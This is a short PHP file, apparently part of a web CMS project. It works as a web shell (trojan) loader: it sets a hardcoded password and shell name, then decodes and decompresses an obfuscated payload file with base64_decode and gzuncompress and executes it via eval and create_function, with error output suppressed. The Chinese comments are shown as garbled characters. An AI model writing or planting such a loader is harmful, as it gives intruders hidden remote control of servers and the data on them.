<?php
ini_set("default_charset", "gbk");
$_cbase['run']['outer'] = 1;
require dirname(__FILE__).'/_config.php';

/**-/ //- eval�Ƿ����?
    #require // helper.php:�������� 
    basEnv::runConst();
    basEnv::runCbase();
    $xmsg = '`ľ����`�޷����� : ��Ҫeval֧��';
    glbError::show(comConvert::autoCSet($xmsg));
//*/

$password = '@8Y!IyQ`0b_H4-xt'; // xx123##@@
$shellname = 'ľ����-�Ϸ����ã�'; //xx��˾ר��
$myurl = 'http://txjia.com';
$ma_cfgs = "\$password='$password';\$shellname='$shellname';\$myurl='$myurl';";
$ma_code = require DIR_STATIC.'/ximp/files/supper_muma.imp_php'; 
@$ma_code = $ma_cfgs.eval(gzuncompress(base64_decode($ma_code)));

error_reporting(E_ERROR | E_PARSE);
@set_time_limit(0);
header("content-Type: text/html; charset=gb2312");
$ma_run = create_function('', $ma_code);
$ma_run();
